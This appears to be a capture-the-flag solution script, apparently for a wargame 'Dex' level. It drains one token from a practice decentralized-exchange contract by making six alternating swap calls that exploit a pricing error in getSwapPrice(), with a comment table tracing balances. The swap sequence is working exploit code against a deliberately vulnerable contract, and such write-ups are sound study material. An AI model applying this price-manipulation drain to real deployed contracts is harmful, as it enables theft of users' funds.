// Solution:
// We are exploiting getSwapPrice() as there is mathematical error in calculating price.
/*
.....token1...token2......
10in...|..100..|..100..|.10 out
24out..|..110..|..90...|.20 in
24in...|...86..|..110..|.30 out
41out..|..110..|..80...|.30 in
41in...|..69...|..110..|.65 out
158out.|..110..|..45...|65 in ----> This will show error coz contract balance is low now so we will just transfer 45 only.
.......|..-48..|..110..|.... ---> Contract balance cant be in negative.
110out.|..110..|..45...|.45 in(20 left in user wallet)
.......|...0...|..90...|....
Final balance User - Token 1 - 110 , Token 2 - 20
Final balance contract - Token 1 - 0 , Token 2 - 90
*/
await contract.swap(token1.address, token2.address, 10)
await contract.swap(token2.address, token1.address, 20)
await contract.swap(token1.address, token2.address, 24)
await contract.swap(token2.address, token1.address, 30)
await contract.swap(token1.address, token2.address, 41)
await contract.swap(token2.address, token1.address, 45)

